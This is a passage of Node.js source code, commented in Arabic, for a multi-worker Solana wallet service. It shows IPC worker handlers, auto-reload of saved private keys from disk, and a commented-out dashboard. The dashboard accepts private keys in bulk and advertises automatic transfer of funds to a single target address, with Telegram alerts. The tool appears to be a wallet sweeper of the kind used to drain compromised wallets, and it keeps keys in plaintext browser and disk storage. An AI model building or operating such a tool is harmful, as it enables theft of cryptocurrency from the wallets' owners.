            msg += `🔹 المحفظة ${i + 1}: ${w.address.slice(0,8)}…\n`;
            msg += `   المراقبة: ${w.hasSubscription && !w.isFailed ? '🟢 نشط' : '🔴 متوقف'}\n`;
            if (w.errorCount > 0) msg += `   أخطاء: ${w.errorCount}\n`;
            msg += '\n';
        });
        msg += `🎯 عنوان الهدف: ${TARGET_ADDR}\n`;
        msg += `⚡ العمال النشطون: ${state.workers}`;
        return msg;
    }

    app.listen(PORT, '0.0.0.0', () => {
        console.log(`[PRIMARY PID:${process.pid}] HTTP on port ${PORT} | UV_THREADPOOL=8 | max-old-space=3072`);
        console.log(`[PRIMARY] Forked ${NUM_EXTRA_WORKERS} extra HTTP worker(s)`);
    });

    // ── تحميل تلقائي للمحافظ المحفوظة بعد أن يكون جميع العمال جاهزين ──────────
    (function scheduleAutoLoad() {
        const saved = loadWalletsFromDisk();
        if (!saved) return; // لا يوجد ملف محفوظ
        _hasSavedWallets = true; // إعلام المتصفح بوجود محافظ محفوظة على الخادم
        const startedAt  = Date.now();
        const MAX_WAIT   = 30_000; // أقصى انتظار 30 ثانية قبل التحميل بأي حال
        const waitForWorkers = () => {
            const elapsed = Date.now() - startedAt;
            if (workersReady < NUM_EXTRA_WORKERS && elapsed < MAX_WAIT) {
                setTimeout(waitForWorkers, 500);
                return;
            }
            if (elapsed >= MAX_WAIT)
                console.warn(`[PERSIST] تحذير: انتهى وقت الانتظار (${MAX_WAIT}ms) — سيتم التحميل بالعمال المتاحين`);
            allRpcUrls   = ALL_RPC_URLS;
            lastSettings = saved.settings || {};
            distributeWork(saved.keys);
            const total  = saved.keys.length;
            addGlobalNotification(`♻️ جاري إعادة تحميل ${total} محفظة تلقائياً من الحفظ السابق…`, 'info');
            console.log(`[PERSIST] إعادة تحميل ${total} محفظة من: ${WALLETS_FILE}`);
            loadAll(lastSettings, total);
        };
        setTimeout(waitForWorkers, 1000); // إعطاء ثانية للعمال لبدء التشغيل
    })();

    process.on('uncaughtException',  e => console.error('[PRIMARY] uncaughtException:', e.message));
    process.on('unhandledRejection', r => console.error('[PRIMARY] unhandledRejection:', r));

} else {
    // ─────────────────────────────────────────────────────────────────────────
    //  WORKER PROCESS — HTTP server + monitors its assigned wallet slice
    // ─────────────────────────────────────────────────────────────────────────

    // Pending IPC requests
    const pending = new Map();
    let reqCounter = 0;

    function ask(cmd, data = {}) {
        return new Promise((resolve) => {
            const reqId = ++reqCounter;
            pending.set(reqId, resolve);
            process.send({ cmd, reqId, ...data });
            setTimeout(() => {
                if (pending.has(reqId)) { pending.delete(reqId); resolve({ error: 'timeout' }); }
            }, 30000);
        });
    }

    // ── debounce لتحديث حالة العامل — منع إغراق IPC بالتحديثات المتتالية ───
    let _stateDebounce = null;
    function sendStateUpdate() {
        if (_stateDebounce) return;
        _stateDebounce = setTimeout(() => {
            _stateDebounce = null;
            process.send({ cmd: 'worker-state-update', state: workerMonitor.getState() });
        }, 200);
    }

    // Local monitor for this worker's wallet slice
    const workerMonitor = new SolanaWorkerMonitor((msg, type) => {
        process.send({ cmd: 'worker-notification', message: msg, notifType: type });
        sendStateUpdate();
    });

    process.on('message', async (msg) => {
        if (msg.cmd === 'response') {
            const resolve = pending.get(msg.reqId);
            if (resolve) { pending.delete(msg.reqId); resolve(msg.result); }
            return;
        }
        if (msg.cmd === 'load-wallets') {
            await workerMonitor.load(msg.keys, msg.rpcs, msg.allRpcs, msg.settings || {});
            sendStateUpdate();
        }
        if (msg.cmd === 'stop-monitoring') {
            workerMonitor.stop(!!msg.clearAll);
            sendStateUpdate();
        }
        if (msg.cmd === 'update-settings') {
            const needsReload = workerMonitor.applySettings(msg.settings || {});
            if (needsReload && msg.keys) {
                await workerMonitor.load(msg.keys, msg.rpcs || [], msg.allRpcs || [], msg.settings);
            }
            sendStateUpdate();
        }
        if (msg.cmd === 'delete-wallet') {
            const removedKey = workerMonitor.removeWallet(msg.address);
            sendStateUpdate();
            if (msg.reqId) {
                process.send({
                    cmd:    'worker-response',
                    reqId:  msg.reqId,
                    result: { found: removedKey !== null, removedKey }
                });
            }
        }
        if (msg.cmd === 'append-wallets') {
            const appendRes = await workerMonitor.appendWallets(msg.keys || [], msg.settings || {});
            sendStateUpdate();
            if (msg.reqId) {
                process.send({
                    cmd:    'worker-response',
                    reqId:  msg.reqId,
                    result: { added: appendRes.addresses.length, addresses: appendRes.addresses, addedKeys: appendRes.keys }
                });
            }
        }
    });

    // العمال يتواصلون مع الـ primary عبر IPC فقط — لا حاجة لـ HTTP server
    console.log(`[WORKER PID:${process.pid}] جاهز (IPC فقط)`);
    process.send({ cmd: 'worker-ready' });

    process.on('uncaughtException',  e => console.error(`[WORKER ${process.pid}] uncaughtException:`, e.message));
    process.on('unhandledRejection', r => console.error(`[WORKER ${process.pid}] unhandledRejection:`, r));
}

// ─────────────────────────────────────────────────────────────────────────────
//  HTML Interface — served from index.html
// ─────────────────────────────────────────────────────────────────────────────
// (moved to index.html — served via express.static / sendFile)
/*
function getHtml() {
    return `<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مراقب محافظ Solana</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;position:relative}
        .container{max-width:1200px;margin:0 auto;background:#fff;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.1);overflow:hidden}
        .header{background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;padding:30px;text-align:center}
        .header h1{font-size:2.5rem;margin-bottom:10px}
        .header .sub{font-size:.9rem;opacity:.8;margin-top:5px}
        .main-content{display:grid;grid-template-columns:1fr 400px;gap:30px;padding:30px}
        .left-panel{display:flex;flex-direction:column;gap:20px}
        .card{background:#f8f9fa;border:2px solid #e9ecef;border-radius:15px;padding:25px;transition:all .3s ease}
        .card:hover{transform:translateY(-5px);box-shadow:0 10px 25px rgba(0,0,0,.1)}
        .card h2{color:#495057;margin-bottom:15px;font-size:1.5rem}
        .form-group{margin-bottom:15px}
        label{display:block;margin-bottom:5px;font-weight:700;color:#495057}
        textarea{width:100%;padding:15px;border:2px solid #dee2e6;border-radius:10px;font-size:14px;resize:vertical;min-height:120px;font-family:monospace;direction:ltr;text-align:left}
        textarea:focus{outline:none;border-color:#667eea;box-shadow:0 0 0 3px rgba(102,126,234,.1)}
        .btn{background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;border:none;padding:15px 30px;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:all .3s ease;width:100%}
        .btn:hover{transform:translateY(-2px);box-shadow:0 5px 15px rgba(102,126,234,.3)}
        .btn.secondary{background:linear-gradient(45deg,#6c757d,#495057)}
        #fileInput{width:100%;padding:10px;border:2px dashed #dee2e6;border-radius:10px;font-size:14px;cursor:pointer;background:#fff;color:#495057}
        #fileInput:hover{border-color:#667eea;background:#f0f2ff}
        .btn.danger{background:linear-gradient(45deg,#dc3545,#c82333)}
        .right-panel{display:flex;flex-direction:column;gap:20px}
        .status-display{background:#f8f9fa;border-radius:15px;padding:20px;font-family:monospace;font-size:14px;white-space:pre-wrap;word-break:break-all;overflow-wrap:break-word;max-height:300px;overflow-y:auto;border:2px solid #e9ecef}
        .notifications{background:#f8f9fa;border-radius:15px;padding:20px;max-height:400px;overflow-y:auto;border:2px solid #e9ecef;word-break:break-all;overflow-wrap:break-word}
        .notification{padding:10px;margin-bottom:10px;border-radius:8px;font-size:14px;border-left:4px solid #667eea}
        .notification.success{background:#d4edda;border-color:#28a745}
        .notification.error{background:#f8d7da;border-color:#dc3545}
        .notification.warning{background:#fff3cd;border-color:#ffc107}
        .notification.info{background:#d1ecf1;border-color:#17a2b8}
        .timestamp{font-size:12px;color:#6c757d;margin-top:5px}
        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:15px;margin-bottom:20px}
        .stat-card{background:#fff;padding:20px;border-radius:10px;text-align:center;border:2px solid #e9ecef}
        .stat-value{font-size:2rem;font-weight:700;color:#667eea}
        .stat-label{color:#6c757d;font-size:14px}
        @media(max-width:768px){.main-content{grid-template-columns:1fr}.header h1{font-size:2rem}}
        .gear-btn{position:fixed;top:16px;left:16px;width:42px;height:42px;border-radius:50%;border:2px solid rgba(255,255,255,0.6);background:rgba(102,126,234,0.85);color:#fff;font-size:20px;cursor:pointer;display:-webkit-inline-flex;display:inline-flex;-webkit-align-items:center;align-items:center;-webkit-justify-content:center;justify-content:center;transition:transform .3s ease,background .3s ease;z-index:200;line-height:1;outline:none;-webkit-appearance:none;appearance:none;padding:0;box-shadow:0 2px 8px rgba(0,0,0,0.25)}
        .gear-btn:hover{background:rgba(118,75,162,0.95);transform:rotate(30deg)}
        .gear-btn.active{background:rgba(118,75,162,1);transform:rotate(60deg)}
        #modeIndicator{position:fixed;top:62px;left:8px;width:58px;text-align:center;font-size:10px;font-weight:700;color:#fff;background:rgba(0,0,0,0.38);border-radius:6px;padding:2px 4px;pointer-events:none;z-index:201;letter-spacing:.3px}
        .settings-panel{position:fixed;top:90px;left:20px;width:300px;background:#fff;border-radius:14px;box-shadow:0 8px 32px rgba(0,0,0,0.22);z-index:9999;border:1px solid #dde}
        .settings-panel-header{background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;padding:11px 16px;font-weight:700;font-size:14px;display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;gap:8px;border-radius:13px 13px 0 0}
        .sp-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;align-items:start;padding:14px 16px}
        @media(max-width:600px){.sp-grid{grid-template-columns:1fr}}
        .sp-label{font-weight:700;color:#495057;font-size:12px;margin-bottom:6px;display:block}
        .sp-row{display:flex;gap:6px}
        .sp-opt{flex:1;padding:9px 6px;border:2px solid #dee2e6;border-radius:8px;cursor:pointer;text-align:center;font-weight:700;font-size:12px;background:#fff;color:#495057;font-family:inherit;-webkit-appearance:none;appearance:none;transition:border-color .15s,background .15s,color .15s}
        .sp-opt:hover{border-color:#aaa;background:#f8f9fa}
        .sp-opt.selected{border-color:#28a745!important;background:#d4edda!important;color:#155724!important}
        .sp-input{width:100%;padding:8px;border:2px solid #dee2e6;border-radius:8px;font-size:12px;direction:ltr;box-sizing:border-box;margin-top:6px}
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <button class="gear-btn" id="gearBtn" title="الإعدادات" onclick="(function(b){var p=document.getElementById('settingsPanel');if(!p)return;var v=p.style.display==='block';p.style.display=v?'none':'block';b.classList.toggle('active',!v);})(this)">⚙️</button>
        <div id="modeIndicator">💸 Main</div>
        <h1>🔥 مراقب محافظ Solana</h1>
        <p>مراقبة وتحويل الأموال تلقائياً — موزّع على عمال متوازيين</p>
        <p class="sub">⚡ 2 vCPU / 4 GB RAM | UV_THREADPOOL=8 | UptimeRobot نشط</p>

    </div>

    <div class="main-content">
        <div class="left-panel">
            <div class="stats">
                <div class="stat-card"><div class="stat-value" id="walletCount">0</div><div class="stat-label">المحافظ الكلية</div></div>
                <div class="stat-card"><div class="stat-value" id="activeCount">0</div><div class="stat-label">النشطة</div></div>
                <div class="stat-card"><div class="stat-value" id="workerCount">0</div><div class="stat-label">العمال</div></div>
                <div class="stat-card"><div class="stat-value" id="errorCount">0</div><div class="stat-label">الأخطاء</div></div>
            </div>

            <div class="card">
                <h2>📝 إضافة محافظ للمراقبة</h2>
                <form id="addForm">
                    <div class="form-group">
                        <label>المفاتيح الخاصة (كل مفتاح في سطر منفصل):</label>
                        <textarea id="privateKeys" placeholder="ضع المفاتيح الخاصة هنا&#10;كل مفتاح في سطر منفصل&#10;سيتم توزيعها تلقائياً على العمال"></textarea>
                    </div>
                    <div class="form-group">
                        <label>أو ارفع ملف .txt يحتوي على المفاتيح:</label>
                        <div class="file-upload-area" id="fileUploadArea">
                            <input type="file" id="fileInput" accept=".txt,text/plain">
                            <span id="fileName" style="margin-right:10px;color:#6c757d;font-size:14px"></span>
                        </div>
                    </div>
                    <button type="submit" class="btn" id="addBtn">إضافة المحافظ وتوزيعها</button>
                </form>
            </div>

            <div class="card">
                <h2>📊 حالة المحافظ</h2>
                <button type="button" class="btn secondary" id="statusBtn">عرض الحالة</button>
                <div class="status-display" id="statusDisplay"></div>
            </div>

            <div class="card">
                <h2 id="toggleTitle">⏹️ إيقاف المراقبة</h2>
                <button type="button" class="btn danger" id="toggleBtn">إيقاف جميع المحافظ</button>
            </div>
        </div>

        <div class="right-panel">
            <div class="card">
                <h2>🔔 الإشعارات المباشرة</h2>
                <div class="notifications" id="notifications">
                    <div class="notification info"><div>مرحباً بك في مراقب محافظ Solana الموزّع!</div></div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- قائمة الإعدادات المنسدلة -->
<div id="settingsPanel" style="display:none;position:fixed;top:90px;left:20px;width:290px;background:#fff;border-radius:14px;box-shadow:0 8px 32px rgba(0,0,0,0.22);z-index:9999;border:1px solid #dde;overflow:hidden">
    <div style="background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;padding:11px 16px;font-weight:700;font-size:14px">⚙️ الإعدادات</div>

    <!-- وضع التشغيل -->
    <div style="padding:12px 14px 8px">
        <div style="font-size:12px;font-weight:700;color:#495057;margin-bottom:7px">🔧 وضع التشغيل</div>
        <div style="display:flex;gap:6px">
            <button type="button" id="btn-forward"  class="sp-opt" onclick="setMode('forward')">💸 إرسال</button>
            <button type="button" id="btn-telegram" class="sp-opt" onclick="setMode('telegram')">📨 تلجرام</button>
        </div>
        <div id="chatGroup" style="display:none;margin-top:8px">
            <div style="font-size:11px;font-weight:700;color:#495057;margin-bottom:4px">🆔 Telegram Chat ID</div>
            <input type="text" id="sp-chatId" placeholder="-100xxxxxxxxxx" class="sp-input"
                   oninput="currentSettings.chatId=this.value.trim();saveSettings(currentSettings)">
        </div>
    </div>

    <div style="height:1px;background:#f0f0f0;margin:0 14px"></div>

    <!-- الشبكة -->
    <div style="padding:8px 14px 4px">
        <div style="font-size:12px;font-weight:700;color:#495057;margin-bottom:7px">🌐 الشبكة</div>
        <div style="display:flex;gap:6px">
            <button type="button" id="btn-mainnet" class="sp-opt" onclick="setNetwork('mainnet')">🟠 Mainnet</button>
            <button type="button" id="btn-devnet"  class="sp-opt" onclick="setNetwork('devnet')">🟣 Devnet</button>
        </div>
    </div>

    <div style="height:1px;background:#f0f0f0;margin:8px 14px 0"></div>

    <!-- تطبيق -->
    <div style="padding:10px 14px 14px">
        <button type="button" id="applySettingsBtn" onclick="applyCurrentSettings()" style="width:100%;padding:10px;border:none;border-radius:8px;background:linear-gradient(45deg,#667eea,#764ba2);color:#fff;font-weight:700;font-size:12px;cursor:pointer;font-family:inherit">⚡ حفظ وتطبيق الإعدادات</button>
        <div style="font-size:10px;color:#888;text-align:center;margin-top:5px">تُحفظ قبل الإضافة • تُطبَّق فوراً على المراقبة الجارية</div>
    </div>
</div>

<script>
    const SK_KEYS    = 'solana_monitor_keys';
    const SK_STATE   = 'solana_monitor_state';
    const SK_SETTINGS = 'solana_monitor_settings';

    const saveKeys     = k => localStorage.setItem(SK_KEYS, k);
    const loadKeys     = () => localStorage.getItem(SK_KEYS) || '';
    const saveState    = v => localStorage.setItem(SK_STATE, v ? '1' : '0');
    const loadState    = () => localStorage.getItem(SK_STATE) === '1';
    const saveSettings = s => { try { localStorage.setItem(SK_SETTINGS, JSON.stringify(s)); } catch(_) {} };
    const loadSettings = () => { try { return JSON.parse(localStorage.getItem(SK_SETTINGS) || '{}'); } catch(_) { return {}; } };

    // ── إدارة الإعدادات ──────────────────────────────────────────────────────
    let currentSettings = Object.assign({ mode: 'forward', network: 'mainnet', chatId: '' }, loadSettings());

    // ── تحديث مؤشر الوضع الصغير تحت زر الترس ──────────────────────────────
    function updateModeIndicator() {
        var el = document.getElementById('modeIndicator');
        if (!el) return;
        el.textContent = (currentSettings.mode === 'telegram' ? '📨' : '💸') + ' ' +
                         (currentSettings.network === 'devnet' ? 'Dev' : 'Main');
    }

    // ── تحديد/إلغاء تحديد زر بـ class صريحة ───────────────────────────────
    function markBtn(id, active) {
        var el = document.getElementById(id);
        if (!el) return;
        if (active) {
            el.classList.add('selected');
        } else {
            el.classList.remove('selected');
        }
    }

    // ── تحديد وضع التشغيل (مجموعة مستقلة) ──────────────────────────────────
    function setMode(mode) {
        currentSettings.mode = mode;
        saveSettings(currentSettings);
        markBtn('btn-forward',  mode === 'forward');
        markBtn('btn-telegram', mode === 'telegram');
        document.getElementById('chatGroup').style.display = mode === 'telegram' ? 'block' : 'none';
        updateModeIndicator();
    }

    // ── تحديد الشبكة (مجموعة مستقلة) ───────────────────────────────────────
    function setNetwork(network) {
        currentSettings.network = network;
        saveSettings(currentSettings);
        markBtn('btn-mainnet', network === 'mainnet');
        markBtn('btn-devnet',  network === 'devnet');
        updateModeIndicator();
    }

    // ── حفظ وتطبيق الإعدادات ────────────────────────────────────────────────
    // • قبل إضافة المحافظ: تُحفظ محلياً وتُستخدم تلقائياً عند الإضافة
    // • بعد إضافة المحافظ: تُطبَّق على المراقبة الجارية دون إعادة تحميل
    //   (تغيير الشبكة أثناء المراقبة يُعيد التحميل تلقائياً في الخلفية)
    async function applyCurrentSettings() {
        if (currentSettings.mode === 'telegram' && !currentSettings.chatId.trim()) {
            alert('⚠️ الرجاء إدخال Telegram Chat ID قبل الحفظ.'); return;
        }
        // حفظ محلي دائماً (يُستخدم عند إضافة المحافظ لاحقاً)
        saveSettings(currentSettings);
        updateModeIndicator();

        var btn = document.getElementById('applySettingsBtn');
        if (btn) { btn.textContent = '⏳ جاري الحفظ...'; btn.disabled = true; }
        try {
            // إذا كانت المراقبة جارية → طبّق مباشرة على السيرفر
            if (loadState()) {
                var r = await fetch('/api/update-settings', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ settings: currentSettings })
                }).then(function(res) { return res.json(); });
                if (r && r.success) {
                    await loadNotifications();
                    if (r.reload) {
                        // تغيير شبكة → إعادة تحميل في الخلفية
                        alert('🔄 ' + r.message);
                    } else {
                        alert('✅ ' + r.message);
                    }
                } else if (r) { alert('خطأ: ' + r.message); }
            } else {
                // لا مراقبة جارية — الإعدادات محفوظة وستُطبَّق عند إضافة المحافظ
                alert('✅ الإعدادات حُفِظت وستُطبَّق عند إضافة المحافظ.');
            }
        } catch(e) { alert('خطأ: ' + e.message); }
        finally { if (btn) { btn.textContent = '⚡ حفظ وتطبيق الإعدادات'; btn.disabled = false; } }
    }

    // ── تهيئة لوحة الإعدادات ────────────────────────────────────────────────
    function initSettingsUI() {
        var ci = document.getElementById('sp-chatId');
        if (ci) ci.value = currentSettings.chatId;

        // إغلاق اللوحة عند النقر خارجها — closest يتجنب مشكلة العقد المنفصلة
        document.addEventListener('click', function(e) {
            var panel = document.getElementById('settingsPanel');
            if (panel.style.display !== 'block') return;
            if (!e.target.closest('#settingsPanel, #gearBtn')) {
                panel.style.display = 'none';
                document.getElementById('gearBtn').classList.remove('active');
            }
        });

        // تطبيق الحالة المحفوظة
        setMode(currentSettings.mode);
        setNetwork(currentSettings.network);
    }

    function setUI(isMonitoring) {
        const btn   = document.getElementById('toggleBtn');
        const title = document.getElementById('toggleTitle');
        btn.textContent   = isMonitoring ? 'إيقاف جميع المحافظ' : 'استئناف المراقبة';
        btn.className     = isMonitoring ? 'btn danger' : 'btn';
        title.textContent = isMonitoring ? '⏹️ إيقاف المراقبة' : '▶️ استئناف المراقبة';
    }

    async function loadNotifications() {
        try {
            const notifs = await (await fetch('/api/notifications')).json();
            const el = document.getElementById('notifications');
            el.innerHTML = notifs.length
                ? notifs.map(n => '<div class="notification '+n.type+'"><div>'+n.message+'</div><div class="timestamp">'+new Date(n.timestamp).toLocaleString('ar-EG')+'</div></div>').join('')
                : '<div class="notification info">لا توجد إشعارات حالياً</div>';
            updateStats();
        } catch(e) { console.error(e); }
    }

    async function updateStats() {
        try {
            const s = await (await fetch('/api/state')).json();
            document.getElementById('walletCount').textContent = s.totalWallets  || 0;
            document.getElementById('activeCount').textContent = s.totalActive   || 0;
            document.getElementById('workerCount').textContent = s.workers       || 0;
            document.getElementById('errorCount').textContent  = s.totalFailed   || 0;
        } catch(e) {}
    }

    async function addWallets(keys) {
        if (currentSettings.mode === 'telegram' && !currentSettings.chatId.trim()) {
            return { success: false, message: '⚠️ الرجاء إدخال Telegram Chat ID في الإعدادات (⚙️) قبل المتابعة.' };
        }
        const settings   = { mode: currentSettings.mode, network: currentSettings.network, chatId: currentSettings.chatId };
        return (await fetch('/api/add-wallets', {
            method:  'POST',
            headers: {'Content-Type': 'application/json'},
            body:    JSON.stringify({ privateKeys: keys, settings })
        })).json();
    }

    // ── رفع ملف .txt ────────────────────────────────────────────────────────
    document.getElementById('fileInput').addEventListener('change', function(e) {
        const file = e.target.files[0];
        if (!file) return;

        document.getElementById('fileName').textContent = '⏳ جاري قراءة الملف: ' + file.name;

        const reader = new FileReader();

        reader.onerror = function() {
            document.getElementById('fileName').textContent = '❌ فشل قراءة الملف';
            alert('فشل في قراءة الملف، حاول مجدداً');
        };

        reader.onload = async function(ev) {
            const content = ev.target.result || '';
            const lines = content.split(/[\r\n]+/);
            const newKeys = lines.map(k => k.trim()).filter(k => k.length > 30).join('\n');

            if (!newKeys) {
                document.getElementById('fileName').textContent = '⚠️ لا توجد مفاتيح صالحة في: ' + file.name;
                alert('لم يُعثر على مفاتيح صالحة في الملف\n\nتأكد أن كل سطر يحتوي على مفتاح خاص بتنسيق base58');
                return;
            }

            const keyCount = newKeys.split('\n').length;
            document.getElementById('fileName').textContent = '✅ ' + file.name + ' — ' + keyCount + ' مفتاح';

            const current = document.getElementById('privateKeys').value.trim();
            document.getElementById('privateKeys').value = current ? current + '\n' + newKeys : newKeys;

            // إرسال تلقائي بعد قراءة الملف
            const btn = document.getElementById('addBtn');
            btn.textContent = 'جاري الإضافة والتوزيع...'; btn.disabled = true;
            try {
                const keys = document.getElementById('privateKeys').value;
                const r = await addWallets(keys);
                if (r.success) {
                    saveKeys(keys.trim()); saveState(true); setUI(true);
                    document.getElementById('privateKeys').value = '';
                    await loadNotifications();
                    alert(r.message);
                } else {
                    alert('خطأ: ' + r.message);
                }
            } catch(err) {
                alert('خطأ في الاتصال بالسيرفر: ' + err.message);
            } finally {
                btn.textContent = 'إضافة المحافظ وتوزيعها'; btn.disabled = false;
            }
        };

        reader.readAsText(file);
    });

    document.getElementById('addForm').addEventListener('submit', async e => {
        e.preventDefault();
        const btn  = document.getElementById('addBtn');
        const keys = document.getElementById('privateKeys').value;
        if (!keys.trim()) { alert('الرجاء إدخال المفاتيح الخاصة'); return; }
        btn.textContent = 'جاري الإضافة والتوزيع...'; btn.disabled = true;
        try {
            const r = await addWallets(keys);
            if (r.success) {
                saveKeys(keys.trim()); saveState(true); setUI(true);
                document.getElementById('privateKeys').value = '';
                await loadNotifications();
                alert(r.message);
            } else { alert('خطأ: ' + r.message); }
        } catch(err) { alert('خطأ: ' + err.message); }
        finally { btn.textContent = 'إضافة المحافظ وتوزيعها'; btn.disabled = false; }
    });

    document.getElementById('statusBtn').addEventListener('click', async () => {
        const btn = document.getElementById('statusBtn');
        btn.textContent = 'جاري التحديث...'; btn.disabled = true;
        try {
            const s = await (await fetch('/api/status')).json();
            document.getElementById('statusDisplay').textContent = s.message;
        } catch(e) { document.getElementById('statusDisplay').textContent = 'خطأ: ' + e.message; }
        finally { btn.textContent = 'عرض الحالة'; btn.disabled = false; }
    });

    document.getElementById('toggleBtn').addEventListener('click', async () => {
        const btn = document.getElementById('toggleBtn');
        const isStopping = btn.textContent.includes('إيقاف');

        if (isStopping) {
            if (!confirm('هل أنت متأكد من إيقاف مراقبة جميع المحافظ؟')) return;
            btn.textContent = 'جاري الإيقاف...'; btn.disabled = true;
            try {
                const r = await (await fetch('/api/stop', {method:'POST'})).json();
                saveState(false); setUI(false);
                await loadNotifications(); alert(r.message);
            } catch(e) { alert('خطأ: ' + e.message); }
            finally { btn.disabled = false; }
        } else {
            const keys = loadKeys();
            if (!keys) { alert('لا توجد محافظ محفوظة. الرجاء إضافة محافظ أولاً.'); return; }
            btn.textContent = 'جاري الاستئناف...'; btn.disabled = true;
            try {
                const r = await addWallets(keys);
                if (r.success) { saveState(true); setUI(true); await loadNotifications(); alert(r.message); }
                else { alert('خطأ: ' + r.message); }
            } catch(e) { alert('خطأ: ' + e.message); }
            finally { btn.disabled = false; }
        }
    });

    document.addEventListener('DOMContentLoaded', async () => {
        initSettingsUI();
        const keys = loadKeys();
        const was  = loadState();

        try {
            const serverState = await (await fetch('/api/state')).json();
            const actuallyMonitoring = serverState.isMonitoring && serverState.totalActive > 0;
            setUI(actuallyMonitoring);
            saveState(actuallyMonitoring);

            // تحديث الأرقام فوراً بدون انتظار الـ interval
            document.getElementById('walletCount').textContent = serverState.totalWallets || 0;
            document.getElementById('activeCount').textContent = serverState.totalActive  || 0;
            document.getElementById('workerCount').textContent = serverState.workers      || 0;
            document.getElementById('errorCount').textContent  = serverState.totalFailed  || 0;

            // استئناف تلقائي
            if (keys && was && !actuallyMonitoring) {
                try {
                    const r = await addWallets(keys);
                    if (r.success) { setUI(true); saveState(true); await updateStats(); }
                } catch(e) { console.error('Auto-restore:', e); }
            }
        } catch(e) {
            setUI(keys ? was : false);
        }

        await loadNotifications();
        setInterval(loadNotifications, 5000);
        // تحديث الأرقام بشكل مستقل كل 3 ثوانٍ
        setInterval(updateStats, 3000);

    });
</script>
</body>
</html>`;
}
*/
